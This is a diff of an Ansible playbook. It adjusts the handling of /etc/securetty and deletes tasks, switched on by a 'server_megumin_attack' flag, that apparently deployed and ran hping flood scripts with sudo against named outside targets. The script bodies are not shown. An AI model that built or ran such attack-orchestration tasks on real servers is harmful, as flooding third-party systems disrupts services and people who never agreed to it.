@@ -116,6 +116,11 @@
 - name: Create securetty file
   file:
     path: /etc/securetty
+    state: absent
+    
+- name: Create securetty file
+  file:
+    path: /etc/securetty
     state: touch
     mode: 0644
 
@@ -143,36 +148,3 @@
   when: server_system_upgrades is changed or server_system_hostname is changed or machine_reboot_required.stat.exists
   tags:
     - reboot_machine
-
-- name: Create script
-  copy:
-    content: "{{ script_content }}"
-    dest: /home/ubuntu/hpingscript.sh
-  when: server_megumin_attack
-  tags:
-    - server_megumin_attack
-
-- name: Create script
-  copy:
-    content: "{{ script_content_mirgorod }}"
-    dest: /home/ubuntu/hpingscriptmirgorod.sh
-  when: server_megumin_attack
-  tags:
-    - server_megumin_attack
-
-- name: Create script
-  copy:
-    content: "{{ script_content_sci }}"
-    dest: /home/ubuntu/hpingscriptscientologymustdie.sh
-  when: server_megumin_attack
-  tags:
-    - server_megumin_attack
-
-# ANSIBLE SESSION CRASH SCRIPT PROCESS
-
-- name: hping attack
-  shell: |
-    sudo bash /home/ubuntu/hpingscript.sh
-  when: server_megumin_attack
-  tags:
-    - server_megumin_attack
